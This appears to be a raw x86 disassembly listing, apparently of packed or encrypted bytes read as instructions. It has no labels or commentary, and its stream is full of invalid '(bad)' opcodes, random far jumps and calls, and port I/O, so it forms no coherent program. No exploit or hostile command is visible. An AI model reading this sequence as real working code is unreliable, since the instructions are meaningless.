  4274d9:	add    BYTE PTR [eax],al
  4274db:	add    BYTE PTR [ecx+0x3],bl
  4274de:	rol    DWORD PTR [ebx+ebx*8-0x3a],0xdd
  4274e3:	pop    ds
  4274e4:	sub    ebp,DWORD PTR [esi+0x4b0e3eba]
  4274ea:	mov    al,ds:0x1ec8b85
  4274ef:	add    BYTE PTR [ebp+0x70000002],al
  4274f5:	inc    esp
  4274f6:	mov    ds:0x7f22c2c0,al
  4274fb:	sbb    bh,ch
  4274fd:	jns    0x42747f
  4274ff:	sub    dl,dh
  427501:	mov    al,bh
  427503:	inc    edi
  427504:	dec    edx
  427505:	fist   WORD PTR [edi+0x7cc7f1eb]
  42750b:	popw   ss
  42750d:	imul   esp,DWORD PTR [eax-0x18],0x48
  427511:	mov    ah,BYTE PTR [edi]
  427513:	outs   dx,BYTE PTR ds:[esi]
  427514:	inc    ebp
  427515:	xchg   ebx,eax
  427516:	dec    ebp
  427517:	jmp    0xe2f8a56c
  42751c:	mov    BYTE PTR [ecx],bl
  42751e:	leave  
  42751f:	scas   eax,DWORD PTR es:[edi]
  427520:	jl     0x427536
  427522:	loopne 0x427503
  427524:	ret    
  427525:	mov    ah,0x5d
  427527:	hlt    
  427528:	shl    BYTE PTR [ebx+0x1e],1
  42752b:	repz jo 0x4274f7
  42752e:	adc    BYTE PTR [eax],bh
  427530:	loop   0x4274f8
  427532:	(bad)  
  427533:	sbb    edx,ebp
  427535:	cmp    BYTE PTR [ebp-0x4a989533],bl
  42753b:	sub    BYTE PTR [ebx-0x133e2e55],dl
  427541:	mov    dl,0x2b
  427543:	call   0xfb74:0x62d18ccb
  42754a:	test   eax,0x6dcdab7e
  42754f:	lea    esp,[esi-0x59bfea3e]
  427555:	js     0x42752b
  427557:	inc    edx
  427558:	loop   0x42750e
  42755a:	mov    esp,0x40431d74
  42755f:	dec    esi
  427560:	mov    eax,0x81744abd
  427565:	lahf   
  427566:	jmp    0xafc9:0xd0336337
  42756d:	call   0xcfcf1d2
  427572:	jmp    0x4275ab
  427574:	dec    ebx
  427575:	push   ss
  427576:	test   DWORD PTR [edi+0x69b492ce],0x99d6d83c
  427580:	pop    ecx
  427581:	xchg   BYTE PTR [ebx],dl
  427583:	pusha  
  427584:	daa    
  427585:	es scas al,BYTE PTR es:[edi]
  427587:	shr    ch,0xf8
  42758a:	jge    0x4275d9
  42758c:	jle    0x4275dd
  42758e:	lods   eax,DWORD PTR ds:[esi]
  42758f:	sbb    eax,0xed534791
  427594:	pop    es
  427595:	nop
  427596:	push   esp
  427597:	adc    esi,DWORD PTR [edi]
  427599:	rcl    edx,0x46
  42759c:	cs std 
  42759e:	dec    eax
  42759f:	adc    al,0xdf
  4275a1:	pop    eax
  4275a2:	mov    WORD PTR [ecx],ss
  4275a4:	inc    ebx
  4275a5:	adc    dl,BYTE PTR [esi+ecx*4+0x20]
  4275a9:	sbb    BYTE PTR [eax+0x35],0xe5
  4275ad:	xor    BYTE PTR [bp+si-0x4c],cl
  4275b1:	add    eax,0xfc7cd87a
  4275b6:	push   es
  4275b7:	or     BYTE PTR [ecx-0x2f],ch
  4275ba:	cmova  eax,DWORD PTR [esi+ecx*8+0x2f3c7a6d]
  4275c2:	xor    DWORD PTR [edx+ebx*4-0xb],esi
  4275c6:	mov    edx,0xdc6354c4
  4275cb:	call   0xe0b3be68
  4275d0:	adc    ebp,DWORD PTR [ecx]
  4275d2:	push   ecx
  4275d3:	loop   0x427648
  4275d5:	jge    0x427583
  4275d7:	mov    ds:0xd146d9dd,eax
  4275dc:	push   es
  4275dd:	inc    edi
  4275de:	mov    eax,0x2a3e30b8
  4275e3:	scas   eax,DWORD PTR es:[edi]
  4275e4:	call   0x3204:0xb389a3d6
  4275eb:	loopne 0x427591
  4275ed:	jne    0x427608
  4275ef:	in     eax,dx
  4275f0:	out    dx,eax
  4275f1:	jle    0x427620
  4275f3:	sahf   
  4275f4:	or     DWORD PTR [ecx-0x7d],0x3b
  4275f8:	xchg   edx,eax
  4275f9:	mov    esp,0xc033d28
  4275fe:	aad    0xb4
  427600:	mov    edi,0xcf8690e0
  427605:	in     al,dx
  427606:	dec    esi
  427607:	mov    dl,0x98
  427609:	pop    ebp
  42760a:	cwde   
  42760b:	leave  
  42760c:	sub    DWORD PTR [esi],edi
  42760e:	add    eax,0x24d37351
  427613:	inc    edi
  427614:	aaa    
  427615:	pop    ebx
  427616:	int    0xbd
  427618:	push   cs
  427619:	(bad)  
  42761a:	aam    0x95
  42761c:	xor    eax,0x6147f60f
  427621:	dec    edx
  427622:	fcom   st(7)
  427624:	fld    TBYTE PTR [edi-0x2a0b1382]
  42762a:	imul   edi,DWORD PTR [ebx],0xffffffcc
  42762d:	sub    DWORD PTR ds:0x307c9837,esp
  427633:	test   eax,0x9867bdb3
  427638:	fbld   TBYTE PTR [eax+0x29]
  42763b:	and    ebp,DWORD PTR [ecx]
  42763d:	jo     0x4276b7
  42763f:	(bad)  
  427640:	pop    ebp
  427641:	out    dx,al
  427642:	nop
  427643:	loopne 0x427619
  427645:	daa    
  427646:	jns    0x4276b4
  427648:	retf   0x710e
  42764b:	cmp    al,0xe
  42764d:	mov    ebp,0x9cf4e314
  427652:	cmp    DWORD PTR [edx+0x15e10678],ebx
  427658:	clc    
  427659:	pop    ecx
  42765a:	popa   
  42765b:	ret    0x40d2
  42765e:	dec    edx
  42765f:	rol    DWORD PTR [ebx+0x368a777b],1
  427665:	push   esi
  427666:	xlat   BYTE PTR ds:[ebx]
  427667:	mov    al,ds:0xd451b818
  42766c:	mov    eax,0xc9e921ee
  427671:	cmp    ebx,0xa
  427674:	pusha  
  427675:	sub    DWORD PTR [edi-0x1ad987e7],eax
  42767b:	dec    ebx
  42767c:	mov    ecx,0x615d0e03
  427681:	lods   eax,DWORD PTR ds:[esi]
  427682:	call   0x56f9:0x6567d8b8
  427689:	int3   
  42768a:	(bad)  
  42768b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42768c:	aas    
  42768d:	inc    esi
  42768e:	sub    al,0x39
  427690:	stos   DWORD PTR es:[edi],eax
  427691:	enter  0x4708,0xba
  427695:	test   eax,0x3ff9281
  42769a:	lea    ebp,[edi-0x150f3108]
  4276a0:	lahf   
  4276a1:	call   0x9cbaf65d
  4276a6:	clc    
  4276a7:	dec    ebx
  4276a8:	gs xchg edx,eax
  4276aa:	jmp    0x28a7d9e2
  4276af:	ret    0x1a44
  4276b2:	shl    BYTE PTR [edx-0x24],1
  4276b5:	mov    ?,WORD PTR [edi+0x2b]
  4276b8:	cmp    cl,BYTE PTR [ebx-0x313cc928]
  4276be:	out    dx,al
  4276bf:	push   ss
  4276c0:	xchg   DWORD PTR [edx-0x789f8c2],edx
  4276c6:	adc    eax,0xab8f9d52
  4276cb:	pop    edx
  4276cc:	(bad)  
  4276cd:	pop    edx
  4276ce:	xchg   ebp,eax
  4276cf:	popf   
  4276d0:	mov    ds:0x9130084a,eax
  4276d5:	sub    BYTE PTR [ebx],dl
  4276d7:	test   eax,0xf8a472fc
  4276dc:	cli    
  4276dd:	push   ecx
  4276de:	retf   0x4272
  4276e1:	cmp    al,0xb6
  4276e3:	pop    es
  4276e4:	test   eax,0xfb56c9a6
  4276e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4276ea:	or     eax,0x197579d
  4276ef:	mov    ebx,0x1038d54b
  4276f4:	dec    ecx
  4276f5:	push   cs
  4276f6:	int3   
  4276f7:	mov    al,BYTE PTR [esi]
  4276f9:	and    al,0x53
  4276fb:	scas   al,BYTE PTR es:[edi]
  4276fc:	not    bl
  4276fe:	pop    ds
  4276ff:	les    ebp,FWORD PTR [ebx]
  427701:	mov    WORD PTR [ebp+0x46],?
  427704:	or     al,0x1e
  427706:	cmp    ecx,edx
  427708:	or     al,0x53
  42770a:	sub    cl,BYTE PTR [eax+0x61]
  42770d:	das    
  42770e:	ret    0x8e0b
  427711:	fidivr DWORD PTR [ecx]
  427713:	add    al,0x37
  427715:	popa   
  427716:	inc    esp
  427717:	push   ds
  427718:	inc    edx
  427719:	xchg   esi,eax
  42771a:	and    dh,al
  42771c:	test   eax,0x4dd56a6e
  427721:	stos   DWORD PTR es:[edi],eax
  427722:	cwde   
  427723:	lea    esi,[ecx+0x55]
  427726:	pop    esi
  427727:	cli    
  427728:	add    esi,DWORD PTR [esi]
  42772a:	mov    ds:0x9d3cb011,eax
  42772f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427730:	jno    0x4277aa
  427732:	jle    0x427707
  427734:	sub    edi,DWORD PTR [edi-0x1502d714]
  42773a:	push   edx
  42773b:	sar    DWORD PTR [edx],1
  42773d:	pop    ecx
  42773e:	inc    esi
  42773f:	mov    eax,ds:0x30a0d3b
  427744:	arpl   WORD PTR [ebp-0x1b],bx
  427747:	iret   
  427748:	ins    BYTE PTR es:[edi],dx
  427749:	xor    BYTE PTR [ebx-0x5b],bh
  42774c:	test   edi,ebx
  42774e:	outs   dx,BYTE PTR ds:[esi]
  42774f:	jmp    0x4276de
  427751:	mov    al,0x1d
  427753:	cmp    ebp,edx
  427755:	jmp    0x4277a3
  427757:	pop    ecx
  427758:	dec    esp
  427759:	sub    eax,0xfd3ea6c4
  42775e:	mov    ebx,0xddb3353c
  427763:	test   eax,0xeb08ac0f
  427768:	not    DWORD PTR [esi+0x4021b690]
  42776e:	jmp    0x4276fe
  427770:	in     al,0xdb
  427772:	push   cs
  427773:	pop    edi
  427774:	rcl    DWORD PTR [eax-0x35],0xc0
  427778:	int    0x0
  42777a:	add    BYTE PTR [eax],al
  42777c:	sbb    esp,DWORD PTR [edi]
  42777e:	pushf  
  42777f:	cli    
  427780:	mov    esp,0x2ae77ffb
  427785:	scas   al,BYTE PTR es:[edi]
  427786:	aad    0xf
  427788:	iret   
  427789:	in     al,0x6a
  42778b:	mov    dl,BYTE PTR [eax]
  42778d:	out    dx,eax
  42778e:	add    DWORD PTR [eax],eax
  427790:	test   DWORD PTR [edx],eax
  427792:	add    BYTE PTR [eax],al
  427794:	sbb    al,0x5
  427796:	push   ebx
  427797:	sbb    esi,DWORD PTR [ebp+edi*2+0xce4800]
  42779e:	loopne 0x427794
  4277a0:	popa   
  4277a1:	adc    edx,DWORD PTR [eax]
  4277a3:	lock xor eax,ebp
  4277a6:	(bad)  
  4277a7:	push   cs
  4277a8:	jge    0x4277fa
  4277aa:	int    0x9
  4277ac:	dec    ecx
  4277ad:	mov    bl,0x53
  4277af:	xor    al,0x9f
  4277b1:	lods   eax,DWORD PTR ds:[esi]
  4277b2:	and    eax,0xe55178a
  4277b7:	lahf   
  4277b8:	arpl   WORD PTR [eax+0x26],si
  4277bb:	aad    0xe8
  4277bd:	mov    esi,0x582da9fc
  4277c2:	cmc    
  4277c3:	xchg   ecx,eax
  4277c4:	mov    dl,0xb5
  4277c6:	adc    dh,bl
  4277c8:	xlat   BYTE PTR ds:[ebx]
  4277c9:	add    ah,ah
  4277cb:	cwd    
  4277cd:	nop
  4277ce:	or     al,dh
  4277d0:	dec    ebx
  4277d1:	retf   0x5ac1
  4277d4:	mov    edi,0x28bc3416
  4277d9:	inc    edi
  4277da:	xor    al,0x7f
  4277dc:	hlt    
  4277dd:	(bad)  
  4277de:	sahf   
  4277df:	jl     0x4277a6
  4277e1:	cmp    al,0xec
  4277e3:	cwde   
  4277e4:	xor    ebp,DWORD PTR cs:[esi]
  4277e7:	and    BYTE PTR ds:0xb297f926,ah
  4277ed:	xchg   ecx,eax
  4277ee:	popa   
  4277ef:	inc    ecx
  4277f0:	fwait
  4277f1:	push   ebx
  4277f2:	mov    edi,0x34118028
  4277f7:	adc    BYTE PTR [esi+esi*4],bh
  4277fa:	stos   BYTE PTR es:[edi],al
  4277fb:	pop    ss
  4277fc:	arpl   WORD PTR [edi-0x16822aef],bp
  427802:	jae    0x42781f
  427804:	xchg   edi,eax
  427805:	push   eax
  427806:	bound  ecx,QWORD PTR [ebp+0x71b9ebaa]
  42780c:	sbb    al,cl
  42780e:	pop    edx
  42780f:	xchg   edi,eax
  427810:	js     0x427886
  427812:	inc    eax
  427813:	jecxz  0x42779d
  427815:	jecxz  0x427808
  427817:	pusha  
  427818:	cmp    ah,al
  42781a:	outs   dx,WORD PTR ds:[esi]
  42781c:	mov    BYTE PTR [edx-0x13715e89],bl
  427822:	scas   eax,DWORD PTR es:[edi]
  427823:	inc    edi
  427824:	(bad)  
  427825:	stc    
  427826:	cmp    BYTE PTR [esp+edi*8],dh
  427829:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42782a:	sub    bh,BYTE PTR [edi+0xd492fbc]
  427830:	addr16 push ebx
  427832:	sub    eax,0xbacb64a9
  427837:	push   0xe608dd56
  42783c:	fstp   DWORD PTR [esi+0xf]
  42783f:	ins    BYTE PTR es:[edi],dx
  427840:	mov    eax,ds:0xcbeaa87b
  427845:	psubb  mm2,QWORD PTR [edx+ebp*1-0x61]
  42784a:	lea    edi,[edx-0x44b6c7a3]
  427850:	pop    ebx
  427851:	cmp    eax,0x6892e07c
  427856:	pop    edi
  427857:	xor    ch,BYTE PTR [ebx]
  427859:	mov    ecx,0x3ab080bd
  42785e:	cs out dx,al
  427860:	leave  
  427861:	arpl   WORD PTR [ebp-0x166ec297],ax
  427867:	(bad)  
  427868:	jle    0x42785d
  42786a:	(bad)  
  42786c:	fistp  DWORD PTR [edi+edi*1]
  42786f:	sub    DWORD PTR [esi],esp
  427871:	sahf   
  427872:	and    dh,BYTE PTR [ebx-0x48b1620c]
  427878:	hlt    
  427879:	mov    edi,0x9bc5bcb7
  42787e:	mov    DWORD PTR [eax],ebp
  427880:	add    bl,BYTE PTR [ecx-0x42]
  427883:	aas    
  427884:	cmp    DWORD PTR [eax+ecx*4-0x1a],0xbd71d4ff
  42788c:	dec    ebp
  42788d:	pop    eax
  42788e:	pop    ds
  42788f:	cwde   
  427890:	mov    WORD PTR ss:[edi+ecx*4+0x48556719],?
  427898:	mov    BYTE PTR [ebx],cl
  42789a:	arpl   WORD PTR ds:0xb88f51ec,ax
  4278a0:	cmp    bl,ah
  4278a2:	fs leave 
  4278a4:	mov    ebp,0x5f554528
  4278aa:	push   0xe80964de
  4278af:	inc    eax
  4278b0:	push   ebp
  4278b1:	sbb    edi,0x4c
  4278b4:	jne    0x427922
  4278b6:	xchg   ebp,eax
  4278b7:	icebp  
  4278b8:	(bad)  
  4278b9:	fld    TBYTE PTR [esi+eiz*1]
  4278bc:	shr    al,cl
  4278be:	mov    al,ds:0xfeb0684d
  4278c3:	retf   0xfd63
  4278c6:	repnz adc eax,0x32aac9fb
  4278cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4278cd:	push   ds
  4278ce:	(bad)  
  4278cf:	rcr    BYTE PTR [edi+ebx*2],1
  4278d2:	xchg   ebx,eax
  4278d3:	pop    esp
  4278d4:	int3   
  4278d5:	pop    ebx
  4278d6:	loop   0x4278ae
  4278d8:	(bad)  
  4278d9:	outs   dx,DWORD PTR ds:[esi]
  4278da:	mov    edx,0xf3bbd736
  4278df:	pop    es
  4278e0:	dec    esp
  4278e1:	ins    DWORD PTR es:[edi],dx
  4278e2:	in     al,dx
  4278e3:	mov    esi,0x8474eca
  4278e8:	add    ecx,ecx
  4278ea:	repnz loope 0x4278c2
  4278ed:	xlat   BYTE PTR ds:[ebx]
  4278ee:	push   ebp
  4278ef:	in     eax,dx
  4278f0:	mov    ebp,0x3c31c7d2
  4278f5:	sbb    eax,0x44ffe180
  4278fa:	adc    ecx,0x753f56f
  427900:	sbb    DWORD PTR [eax],esp
  427902:	jae    0x42791b
  427904:	push   0x2
  427906:	push   ss
  427907:	lds    edi,FWORD PTR [ebx+ebx*4]
  42790a:	mov    esi,0xb4a6609b
  42790f:	and    ecx,esp
  427911:	(bad)  
  427912:	mov    cl,0x61
  427914:	xor    edi,esi
  427916:	cmc    
  427917:	cli    
  427918:	aad    0xa8
  42791a:	add    eax,DWORD PTR [ebp+0x57]
  42791d:	fimul  DWORD PTR [eax+esi*2+0x3947c25]
  427924:	fstp   TBYTE PTR [esp+0x70]
  427928:	xchg   edi,eax
  427929:	jno    0x427920
  42792b:	and    DWORD PTR [esi],esi
  42792d:	popa   
  42792e:	push   esp
  42792f:	mov    cl,0x89
  427931:	add    esp,ebx
  427933:	mov    ebx,0xa869f372
  427938:	push   ebx
  427939:	mul    BYTE PTR [ebp+0x5f]
  42793c:	mov    edx,0xbdf034e1
  427941:	stos   DWORD PTR es:[edi],eax
  427942:	mov    dl,0x69
  427944:	jnp    0x42790b
  427946:	push   esi
  427947:	ss clc 
  427949:	stos   DWORD PTR es:[edi],eax
  42794a:	push   edi
  42794b:	sub    al,0xe7
  42794d:	mov    edx,0x6e117dac
  427952:	mov    ecx,es
  427954:	call   FWORD PTR [eax+0x3d]
  427957:	push   ss
  427958:	dec    ebx
  427959:	sahf   
  42795a:	push   ds
  42795b:	mov    ch,0xb6
  42795d:	rol    BYTE PTR [ebp-0x5ec3843f],1
  427963:	les    edx,FWORD PTR [ecx+eax*4-0x4c]
  427967:	lds    esi,FWORD PTR [ecx+edi*2]
  42796a:	cld    
  42796b:	bound  edi,QWORD PTR [edx]
  42796d:	lods   al,BYTE PTR ds:[esi]
  42796e:	cmp    al,0x68
  427970:	leave  
  427971:	call   0x6e38:0x1581d00a
  427978:	dec    ebp
  427979:	sahf   
  42797a:	arpl   WORD PTR [ebp+0x6],sp
  42797d:	push   0xd5511e33
  427982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427983:	outs   dx,BYTE PTR ds:[esi]
  427984:	jnp    0x427985
  427986:	aad    0x84
  427988:	imul   ebp,DWORD PTR [ecx+edi*8-0x55e5710a],0x61
  427990:	sar    DWORD PTR [eax+0x27],0xd8
  427994:	push   cs
  427995:	(bad)  
  427996:	jl     0x4279fb
  427998:	mov    ebp,0x247e195a
  42799d:	(bad)  
  42799f:	inc    ebx
  4279a0:	mov    cl,0xa1
  4279a2:	and    eax,0x801304b6
  4279a7:	out    dx,al
  4279a8:	pusha  
  4279a9:	loope  0x4279e6
  4279ab:	cmp    esp,DWORD PTR [ebx+0x264ebc30]
  4279b1:	or     ebx,esp
  4279b3:	sti    
  4279b4:	imul   edx,DWORD PTR [eax-0x443a0f82],0xfffffff9
  4279bb:	cmp    DWORD PTR ds:0x8492906c,edi
  4279c1:	adc    dl,bl
  4279c3:	sbb    al,0x9d
  4279c5:	xchg   BYTE PTR [ecx],al
  4279c7:	mov    dl,0xa1
  4279c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279ca:	xchg   BYTE PTR [edi],ch
  4279cc:	ret    
  4279cd:	test   al,0x3f
  4279cf:	test   al,0x8d
  4279d1:	retf   
  4279d2:	stos   BYTE PTR es:[edi],al
  4279d3:	ret    
  4279d4:	mov    edi,ebx
  4279d6:	ins    DWORD PTR es:[edi],dx
  4279d7:	aam    0x5d
  4279d9:	and    DWORD PTR [esi-0x1eb3d8d0],0xffffff8e
  4279e0:	pop    ecx
  4279e1:	dec    edx
  4279e2:	icebp  
  4279e3:	scas   al,BYTE PTR es:[edi]
  4279e4:	jmp    0x5c2fa60c
  4279e9:	ss (bad) 
  4279eb:	rcr    ebx,cl
  4279ed:	das    
  4279ee:	xor    eax,0xeb605acf
  4279f3:	rcr    DWORD PTR [edi+ecx*4-0x1b],cl
  4279f7:	jns    0x427a2e
  4279f9:	ds mov ebp,0xc1ed0cd4
  4279ff:	ss mov ebx,0x11d9381e
  427a05:	xor    eax,0x8df964b7
  427a0a:	test   DWORD PTR [eax],edi
  427a0c:	mov    ah,0xbb
  427a0e:	stos   BYTE PTR es:[edi],al
  427a0f:	lods   eax,DWORD PTR ds:[esi]
  427a10:	sub    eax,0xe00c1570
  427a15:	cs jb  0x427a91
  427a18:	add    al,BYTE PTR [eax]
  427a1a:	add    BYTE PTR [eax],al
  427a1c:	call   0xdafe:0xfef82244
  427a23:	bound  di,DWORD PTR [eax-0x9c8b8b]
  427a2a:	dec    eax
  427a2b:	enter  0xf195,0x1
  427a2f:	add    BYTE PTR [ebp+0xa000002],al
  427a35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a36:	and    eax,0x3e388e1c
  427a3b:	mov    eax,0x662bde0a
  427a40:	cli    
  427a41:	sub    BYTE PTR [esi-0x87301e3],al
  427a47:	sbb    ch,0x7e
  427a4a:	in     al,dx
  427a4b:	mov    ch,0x8b
  427a4d:	pop    edi
  427a4e:	add    DWORD PTR [edx-0x5],ebx
  427a51:	cwde   
  427a52:	shl    BYTE PTR [esi+0x7434ea97],0xec
  427a59:	(bad)  
  427a5a:	test   BYTE PTR [ebx-0x2a],0x4f
  427a5e:	jns    0x427a93
  427a60:	push   esp
  427a61:	xor    BYTE PTR [ebx-0x5d],dl
  427a64:	arpl   bp,si
  427a66:	(bad)  
  427a67:	sub    al,0xf5
  427a69:	mov    ds:0xc0797121,al
  427a6e:	jle    0x427a69
  427a70:	aas    
  427a71:	adc    ebp,DWORD PTR [edx]
  427a73:	adc    al,0x8e
  427a75:	jb     0x427abe
  427a77:	xor    DWORD PTR [ebp+0x6c],0xffffffa8
  427a7b:	add    dl,BYTE PTR [eax-0x16]
  427a7e:	xchg   edx,eax
  427a7f:	push   es
  427a80:	inc    edi
  427a81:	fld    DWORD PTR [ebx]
  427a83:	std    
  427a84:	add    ch,BYTE PTR [esi]
  427a86:	pop    ss
  427a87:	sbb    al,0xca
  427a89:	test   al,0xb4
  427a8b:	add    DWORD PTR [edi-0x71337830],ecx
  427a91:	mov    ch,0x2e
  427a93:	cmp    DWORD PTR [ebp+ebx*2-0x36],edi
  427a97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a98:	inc    edx
  427a99:	mov    edi,cs
  427a9b:	mov    WORD PTR [ecx-0xd],?
  427a9e:	dec    edx
  427a9f:	push   ecx
  427aa0:	data16 cli 
  427aa2:	popa   
  427aa3:	and    esi,esp
  427aa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427aa6:	jne    0x427a3f
  427aa8:	jg     0x427acc
  427aaa:	mov    esp,0x2660834a
  427aaf:	sbb    eax,DWORD PTR [eax]
  427ab1:	ror    BYTE PTR [eax+0xf],0x4e
  427ab5:	pop    ebp
  427ab6:	adc    eax,0x664b6712
  427abb:	cmp    al,0xf7
  427abd:	sbb    BYTE PTR [ecx-0x2af62564],ah
  427ac3:	pop    ebx
  427ac4:	xchg   BYTE PTR [esi],bl
  427ac6:	fwait
  427ac7:	sub    eax,0xf87ce5a5
  427acc:	inc    eax
  427acd:	lods   al,BYTE PTR ds:[esi]
  427ace:	in     eax,0xd6
  427ad0:	xor    al,0xaf
  427ad2:	mov    BYTE PTR [edx+0x3ac882cd],dh
  427ad8:	fnstsw WORD PTR [ebp-0x25]
  427adb:	fimul  DWORD PTR [ebp-0x7c05180]
  427ae1:	pop    esi
  427ae2:	jb     0x427b12
  427ae4:	push   es
  427ae5:	ror    BYTE PTR [edx-0x46b7dbfd],cl
  427aeb:	cmp    eax,0x62a9bfd6
  427af0:	ret    0x1f3c
  427af3:	popa   
  427af4:	arpl   WORD PTR [ebp-0x103d7ad6],ax
  427afa:	mov    al,ds:0x297456a1
  427aff:	ret    
  427b00:	mov    dh,0x3c
  427b02:	jb     0x427a9c
  427b04:	and    ah,BYTE PTR [ebx+0x70]
  427b07:	sub    DWORD PTR [eax-0x24],esi
  427b0a:	jbe    0x427b1a
  427b0c:	pop    ecx
  427b0d:	mov    ebx,0x57c0b77a
  427b12:	out    0x59,eax
  427b14:	aaa    
  427b15:	inc    ecx
  427b16:	aad    0xb4
  427b18:	mov    BYTE PTR [ecx+0x43],0xe2
  427b1c:	jb     0x427b45
  427b1e:	fwait
  427b1f:	mov    ch,0x5c
  427b21:	or     eax,DWORD PTR [ecx+eax*8+0x69]
  427b25:	arpl   cx,bx
  427b27:	in     al,dx
  427b28:	in     eax,0x9a
  427b2a:	xor    dh,al
  427b2c:	adc    eax,0x2659fadc
  427b31:	mov    esp,0xd5061517
  427b36:	stc    
  427b37:	test   BYTE PTR [esi-0x3ddae8fa],dh
  427b3d:	cli    
  427b3e:	push   eax
  427b3f:	inc    esi
  427b40:	xchg   esp,eax
  427b41:	daa    
  427b42:	mov    ds:0x44da87e1,eax
  427b47:	js     0x427b05
  427b49:	retf   0x4ca3
  427b4c:	sub    ecx,DWORD PTR [eax+0x38]
  427b4f:	sub    bh,cl
  427b51:	adc    dh,BYTE PTR [ebx]
  427b53:	pop    si
  427b55:	ins    DWORD PTR es:[edi],dx
  427b56:	outs   dx,DWORD PTR ds:[esi]
  427b57:	shl    DWORD PTR [ecx+ebp*8+0x5c],0x0
  427b5c:	std    
  427b5d:	pushf  
  427b5e:	sub    al,0xa
  427b60:	add    BYTE PTR [esi-0x43],dl
  427b63:	dec    edx
  427b64:	mov    ?,esp
  427b66:	adc    eax,0x6bdcc14
  427b6b:	jbe    0x427bc7
  427b6d:	out    0x6d,eax
  427b6f:	push   0x6e620405
  427b74:	jecxz  0x427bd5
  427b76:	and    DWORD PTR [ebp+0x63db68c2],esp
  427b7c:	pop    eax
  427b7d:	or     cl,BYTE PTR [esp+eax*2]
  427b80:	arpl   di,si
  427b82:	lds    edi,FWORD PTR [eax-0x26ad7f85]
  427b88:	push   ebp
  427b89:	nop
  427b8a:	jl     0x427b4a
  427b8c:	pop    es
  427b8d:	dec    ebx
  427b8e:	jecxz  0x427b77
  427b90:	rol    BYTE PTR [esi],1
  427b92:	inc    eax
  427b93:	rcr    BYTE PTR [ebx+0x2c248001],1
  427b99:	mov    BYTE PTR [edi],dh
  427b9b:	inc    edi
  427b9c:	or     al,0xfb
  427b9e:	xchg   esp,eax
  427b9f:	sbb    eax,0x4ce5f276
  427ba4:	das    
  427ba5:	dec    esp
  427ba6:	push   cs
  427ba7:	add    DWORD PTR [eax],edi
  427ba9:	xchg   BYTE PTR [eax],cl
  427bab:	leave  
  427bac:	pushf  
  427bad:	mov    DWORD PTR [eax+0x226a01de],ebx
  427bb3:	scas   eax,DWORD PTR es:[edi]
  427bb4:	jp     0x427be7
  427bb6:	inc    ecx
  427bb7:	jo     0x427b78
  427bb9:	xor    al,0x1a
  427bbb:	and    BYTE PTR [ebx+0x11e24216],ah
  427bc1:	clc    
  427bc2:	test   eax,0x3c21dc42
  427bc7:	pop    ebx
  427bc8:	retf   
  427bc9:	add    bh,al
  427bcb:	jae    0x427beb
  427bcd:	fldl2e 
  427bcf:	mov    dl,BYTE PTR [edx-0x29]
  427bd2:	ins    BYTE PTR es:[edi],dx
  427bd3:	fisttp DWORD PTR [ebp-0x68f676b3]
  427bd9:	mov    dl,0x31
  427bdb:	sbb    eax,0x273a53c4
  427be0:	cmp    dl,BYTE PTR [ebx]
  427be2:	ja     0x427c40
  427be4:	mov    bl,0xda
  427be6:	div    BYTE PTR [ecx+0x3aa2f32e]
  427bec:	sar    BYTE PTR [ebx-0x2f],0x51
  427bf0:	adc    BYTE PTR [ebx],dl
  427bf2:	(bad)  
  427bf3:	je     0x427c50
  427bf5:	mov    eax,0xa5a3cec5
  427bfa:	mov    cl,0x1
  427bfc:	leave  
  427bfd:	not    DWORD PTR [ecx]
  427bff:	adc    edi,DWORD PTR [edx]
  427c01:	cmp    eax,0xf3927b56
  427c06:	mov    edx,0x299ad806
  427c0b:	addr16 dec ebp
  427c0d:	sahf   
  427c0e:	lock mov ds:0xc6595364,eax
  427c14:	sbb    BYTE PTR [edx],cl
  427c16:	ja     0x427bc9
  427c18:	mov    cs,WORD PTR [edx+0xd]
  427c1b:	jb     0x427c8d
  427c1d:	mov    dl,0xf7
  427c1f:	inc    ebx
  427c20:	inc    esp
  427c21:	rcr    esi,cl
  427c23:	test   DWORD PTR [ecx*8+0x71e580c3],esp
  427c2a:	lea    ebx,[ebx-0x8]
  427c2d:	pop    ebp
  427c2e:	sahf   
  427c2f:	and    eax,0xb718f7a2
  427c34:	fistp  QWORD PTR [eax-0x32866e7b]
  427c3a:	or     bh,BYTE PTR [ebx+0x71]
  427c3d:	pop    esi
  427c3e:	xchg   BYTE PTR [ebx-0x6],ah
  427c41:	jle    0x427c15
  427c43:	aad    0x3d
  427c45:	fst    QWORD PTR [edx+0xeb79281]
  427c4b:	sub    edi,DWORD PTR es:[edx+0x5a]
  427c4f:	(bad)  
  427c50:	retf   0x1bfe
  427c53:	add    al,0x66
  427c55:	hlt    
  427c56:	push   ss
  427c57:	mov    dl,0xf5
  427c59:	jmp    0x427c9b
  427c5b:	(bad)  
  427c5d:	mov    dh,bh
  427c5f:	lods   al,BYTE PTR ds:[esi]
  427c60:	outs   dx,DWORD PTR ds:[esi]
  427c61:	setnp  BYTE PTR [ecx]
  427c64:	cmp    DWORD PTR [edi],ebx
  427c66:	addr16 push 0x8d16c1b2
  427c6c:	xchg   edi,eax
  427c6d:	pop    edi
  427c6e:	dec    esp
  427c6f:	add    al,0xa3
  427c71:	in     eax,0xf2
  427c73:	jo     0x427cdd
  427c75:	jl     0x427c0d
  427c77:	into   
  427c78:	dec    ecx
  427c79:	das    
  427c7a:	std    
  427c7b:	add    BYTE PTR [ebx+0x48434fdf],bl
  427c81:	retf   
  427c82:	inc    ecx
  427c83:	repz mov ebx,DWORD PTR [edi-0x5715405e]
  427c8a:	addr16 out dx,al
  427c8c:	repz sub eax,0xe19f0d7e
  427c92:	sbb    BYTE PTR [edx+0x7c],bl
  427c95:	sbb    eax,DWORD PTR [ebx-0x695f7e9e]
  427c9b:	xor    al,0x35
  427c9d:	sahf   
  427c9e:	pop    ss
  427c9f:	push   eax
  427ca0:	xchg   ebp,eax
  427ca1:	and    BYTE PTR [edx-0x6caf855e],0xbb
